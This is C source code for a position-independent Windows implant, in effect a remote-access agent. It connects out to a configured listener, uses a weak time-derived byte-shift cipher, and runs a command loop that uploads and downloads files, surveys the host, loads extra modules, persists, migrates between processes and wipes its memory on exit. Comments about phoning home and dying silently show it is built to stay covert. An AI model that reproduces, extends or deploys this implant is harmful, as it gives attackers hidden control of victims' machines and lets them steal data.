/*
    PIC Implant base. To be used with "64BitHelper.h" with the first linked functionbeing "Begin()". See "function_link_order64.txt".
*/

#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "64BitHelper.h"

#include "../shared/Config.h"

/*
* @brief Starts WSA functionality and sets up the socket connection with an active server
* @param Config a context structure for connection and runtime data
* @return SOCKET of the connected server or 0 if unsuccessful
*/
SOCKET ConnectToListener(PCONFIG Config) {
    // Initialize Winsock
    WSADATA wsaData;
    SecureZeroMemory(&wsaData, sizeof(wsaData)); // Must be used to avoid compiler generating a call to memset
    int error = Config->Imports->WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (error)
    {
        return INVALID_SOCKET;
    }

    // Connect to listener
    SOCKET ListenerSocket = Config->Imports->Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ListenerSocket == INVALID_SOCKET)
    {
        Config->Imports->WSACleanup();
        return INVALID_SOCKET;
    }

    SOCKADDR_IN listenerService = { 0 };
    listenerService.sin_family = AF_INET;
    listenerService.sin_addr.s_addr = Config->ListenerIpAddress;
    listenerService.sin_port = Config->ListenerPort;
    error = Config->Imports->Connect(ListenerSocket, (SOCKADDR*)&listenerService, sizeof(listenerService));
    if (error == SOCKET_ERROR)
    {
        //const char wsaerrstr[] = { 'E', 'r', 'r', ':', ' ', '%', 'u', '\n', '\0' };
        //Config->Imports->DbgPrint(wsaerrstr, Config->Imports->WSAGetLastError());
        Config->Imports->WSACleanup();
        return INVALID_SOCKET;
    }

    return ListenerSocket;
}


/*
* @brief Encrypts the data bytes using the shift key values in the config (shift right)
* @param Config a context structure for connection and runtime data
* @param Length of the data to be encrypted
* @param Data pointer to data buffer to be encrypted
* @return bool, true for success
*/
bool EncryptData(PCONFIG Config, uint32_t Length, uint8_t* Data)
{
    for (unsigned idx = 0; idx < Length; idx++)
    {
        unsigned shift = Config->KeyShifts[idx % 4];
        *(Data + idx) = (uint8_t)(*(Data + idx) + shift);
    }
    return true;
}


/*
* @brief Decrypts the data bytes using the shift key values in the config (shift left)
* @param Config a context structure for connection and runtime data
* @param Length of the data to be decrypted
* @param Data pointer to data buffer to be decrypted
* @return bool, true for success
*/
bool DecryptData(PCONFIG Config, uint32_t Length, uint8_t* Data)
{
    for (unsigned idx = 0; idx < Length; idx++)
    {
        unsigned shift = Config->KeyShifts[idx % 4];
        *(Data + idx) = (uint8_t)(*(Data + idx) - shift);
    }
    return true;
}


/*
* @brief send data to the server from the buffer until full length has been sent
* @param sock active socket with the server
* @param data pointer to the data buffer
* @param len length of the data buffer to be sent
* @param flags, connection flags
* @return int total bytes sent
*/
int FullSend(PCONFIG Config, SOCKET sock, char* data, int len, int flags)
{
    // send it!
    int BytesSent = 0;
    while (BytesSent < len)
    {
        int ChunkSize = Config->Imports->Send(sock, data + BytesSent, len - BytesSent, flags);
        if (ChunkSize == SOCKET_ERROR)
        {
            return SOCKET_ERROR;
        }
        BytesSent += ChunkSize;
    }
    return BytesSent;
}


/*
* @brief
* @param Config a context structure for connection and runtime data
* @param ListenerSocket active socket with the server
* @param Type the Enum value specifying the type of message being sent
* @param Length of the data to be sent
* @param Data pointer to the data buffer
* @return 0 for success
*/
int SendMsg(PCONFIG Config, SOCKET ListenerSocket, MESSAGE_TYPE Type, uint32_t Length, uint8_t* Data)
{
    MESSAGE Header = { 0 };
    Header.Type = Type;
    Header.Length = Length;
    FullSend(Config, ListenerSocket, (char*)&Header, sizeof(Header), 0);
    if (Header.Length)
    {
        if (Type != REQUEST_TASKING && Length > 0)
        {
            EncryptData(Config, Length, Data);
        }
        FullSend(Config, ListenerSocket, (char*)Data, Length, 0);
    }
    return 0;
}


/*
* @brief Receive a message from the server, allocate a buffer to receive its contents, and decrypt it
* @param Config a context structure for connection and runtime data
* @param ListenerSocket active socket with the server
* @return PMESSAGE received message structure
*/
PMESSAGE RecvMsg(PCONFIG Config, SOCKET ListenerSocket)
{
    MESSAGE Header = { 0 };
    Config->Imports->Recv(ListenerSocket, (char*)&Header, sizeof(Header), MSG_WAITALL);

    // guard against heap overflow
    if (Header.Length + (ULONG)sizeof(Header) < Header.Length)
    {
        SendMsg(Config, ListenerSocket, ERR, 0, NULL);
        return NULL;
    }

    PMESSAGE Message = (PMESSAGE)Config->Imports->HeapAlloc(
        Config->Imports->GetProcessHeap(), 0, Header.Length + sizeof(Header));
    Message->Type = Header.Type;
    Message->Length = Header.Length;
    if (Message->Length)
    {
        Config->Imports->Recv(ListenerSocket, (char*)Message->Value, Message->Length, MSG_WAITALL);
    }

    DecryptData(Config, Message->Length, Message->Value);

    return Message;
}


/*
* @brief Uses the current system time and pre-shared modulo numbers to create a shift key sequence.
* Sends the key base to the server for shift key generation.
* @param Config a context structure for connection and runtime data
* @param ListenerSocket active socket with the server
* @return bool true on success
*/
bool EstablishKey(PCONFIG Config, SOCKET ListenerSocket)
{
    // Generate an encryption key base from the system time
    SYSTEMTIME systemTime;
    Config->Imports->GetSystemTime(&systemTime);
    uint32_t keySum = systemTime.wHour + systemTime.wMinute + systemTime.wSecond + systemTime.wMilliseconds;
    Config->KeyShifts[0] = keySum % PRIME1;
    Config->KeyShifts[1] = keySum % PRIME2;
    Config->KeyShifts[2] = keySum % PRIME3;
    Config->KeyShifts[3] = keySum % PRIME4;
    // send request tasking message to server with keySum
    SendMsg(Config, ListenerSocket, REQUEST_TASKING, sizeof(uint32_t), (uint8_t*) &keySum);
    return true;
}


bool ProcessTasking(PCONFIG Config, SOCKET ListenerSocket)
{
    PMESSAGE Message = NULL;
    unsigned DataLen = 0;
    uint8_t * Data = NULL;

    do {
        // clear / free previous message
        if (Message)
        {
            Config->Imports->HeapFree(Config->Imports->GetProcessHeap(), 0, Message);
        }
        // clear / free previous message data length and contents
        DataLen = 0;
        if (Data)
        {
            Config->Imports->HeapFree(Config->Imports->GetProcessHeap(), 0, Data);
            Data = NULL;
        }
        // blocking receive for new message
        Message = RecvMsg(Config, ListenerSocket);
        if (!Message)
        {
            break;
        }

        bool status = false;
        bool missModule = false;

        // perform functionality based on message type passed
        switch (Message->Type)
        {
        case PUT_FILE:
            status = PutFile(Config, Message);
            break;
        case GET_FILE:
            status = GetFile(Config, Message, &DataLen, &Data);
            break;
        case SURVEY:
            status = Survey(Config, Message, &DataLen, &Data);
            break;
        case ADD_MODULE:
            status = AddModule(Config, Message);
            break;
        case PERSIST:
            if (Config->Modules->Persist == NULL)
            {
                missModule = true;
                break;
            }
            status = (*Config->Modules->Persist)((uint8_t *)Config, Message);
            break;
        case MIGRATE:
            if (Config->Modules->Migrate == NULL)
            {
                missModule = true;
                break;
            }
            status = (*Config->Modules->Migrate)((uint8_t *) Config, Message);
            break;
        case TEST:
            if (Config->Modules->Test == NULL)
            {
                missModule = true;
                break;
            }
            status = (*Config->Modules->Test)((uint8_t *)Config, &DataLen, &Data);
            break;
        case TASKING_DONE:
            // shutdown
            break;
        case DISCONNECT:
            // server is sending a socket shutdown, proceed to implant shutdown
            Message->Type = TASKING_DONE;
            break;
        default:
            SendMsg(Config, ListenerSocket, ERR, 0, NULL);
            continue;
        }

        // respond to server with missing code if requested module was missing
        if (missModule)
        {
            SendMsg(Config, ListenerSocket, MISS, 0, NULL);
        }
        // respond to server with success and data (if applicable)
        else if (status && DataLen)
        {
            SendMsg(Config, ListenerSocket, OK, DataLen, Data);
        }
        else if (status)
        {
            SendMsg(Config, ListenerSocket, OK, 0, NULL);
        }
        // if status is false, return an error to the server
        else
        {
            SendMsg(Config, ListenerSocket, ERR, 0, NULL);
        }
    } while (Message->Type != TASKING_DONE);

    if (Data)
    {
        Config->Imports->HeapFree(Config->Imports->GetProcessHeap(), 0, Data);
    }
    if (Message)
    {
        Config->Imports->HeapFree(Config->Imports->GetProcessHeap(), 0, Message);
        return true;
    }
    // if message received was empty
    return false;
}


/*
* @brief Reset Config structure (and substructure) memory to zero. Does not clean currently executing implant code
* @param Config a context structure for connection and runtime data
* @return void
*/
void Cleanup(PCONFIG Config)
{
    /* Things to clean:
    * [X] ModuleX Data: VirtualAlloc / ZeroMemory + VirtualFree
    * [X] Modules Struct: stack / ZeroMemory
    * [X] Config Imports: stack / ZeroMemory
    * [X] Config Struct: stack / ZeroMemory
    */
    // Clean all loaded module data (zero then free)
    for (int idx = 0; idx < sizeof(MODULES); idx += sizeof(void(*)()))
    {
        uint8_t** modulesPtr = (uint8_t**)((uint8_t*)Config->Modules + idx);
        uint8_t* module = *(modulesPtr);
        if (!module)
        {
            continue;
        }
        MEMORY_BASIC_INFORMATION moduleMbi;
        if (!Config->Imports->VirtualQuery((LPCVOID)module, &moduleMbi, sizeof(moduleMbi))) {
            DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to query virtual page of module\n");
        }
        size_t moduleSize = moduleMbi.RegionSize;
        SecureZeroMemory((void*)module, moduleSize);
        if (!Config->Imports->VirtualFree((LPVOID)module, 0, MEM_RELEASE))
        {
            DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to free virtual page of module\n");
        }
    }

    // Clean modules struct
    SecureZeroMemory(Config->Modules, sizeof(MODULES));

    // Free PIC code that was loaded into the process (the implant)
    // get the start address of the PIC code
    //void* picBase = (void *)Begin;

    // get size of PIC
    //MEMORY_BASIC_INFORMATION picMbi;
    //if (!Config->Imports->VirtualQuery(picBase, &picMbi, sizeof(picMbi))) {
    //    DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) Failed to query virtual pages of PIC code\n");
    //}
    //size_t picSize = picMbi.RegionSize;
    //DBGPRINT(Config->Imports->DbgPrint, "(Cleanup) PIC Region Size is %u bytes\n", picSize);

    Config->Imports->WSACleanup();

    // Zero out Config and Imports structs
    SecureZeroMemory(Config->Imports, sizeof(IMPORTS));
    SecureZeroMemory(Config, sizeof(CONFIG));
}


/*
* @brief Get the size of the injected shellcode rounded up to nearest page size
* @param Config a context structure for connection and runtime data
* @return size_t the size of the implant code to the nearest page size
*/
size_t GetPayloadSize(PCONFIG Config)
{
    MEMORY_BASIC_INFORMATION payloadMbi;
    if (!Config->Imports->VirtualQuery(Config->ImplantEntry, &payloadMbi, sizeof(payloadMbi)))
    {
        return 0;
        //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to query virtual page of module\n");
    }
    return payloadMbi.RegionSize;

}


/*
* @brief Implant entry point, loads and links necessary libraries / procedures,
* initializes context structures, establishes socket and encryption key then runs tasking loop.
* @param Config a context structure for connection and runtime data
* @return void
*/
void ExecutePayload(PCONFIG Config)
{
    IMPORTS Imports;
    if (!LinkImports(&Imports))
    {
        return; // Error importing? Guess I'll die \_O_/
    }
    Config->Imports = &Imports;

    MODULES Modules;
    // if no existing Modules struct from a migration, create it here
    if (!Config->Modules)
    {
        SecureZeroMemory(&Modules, sizeof(Modules));
        Config->Modules = &Modules;
    }

    // if Implant size not pre-configured, :(
    if (!Config->ImplantSize)
    {
        return;
    }

    // if Implant entry point not configured, use Begin() address
    if (!Config->ImplantEntry)
    {
		Config->ImplantEntry = (uint8_t *) Begin;
    }

    SOCKET ListenerSocket = ConnectToListener(Config);
    if (ListenerSocket == INVALID_SOCKET)
    {
        // No way to phone home if this failed, just die silently
        return;
    }

    Config->Socket = ListenerSocket;

    EstablishKey(Config, ListenerSocket);

    ProcessTasking(Config, ListenerSocket);

    Imports.CloseSocket(ListenerSocket);

    Cleanup(Config);
}
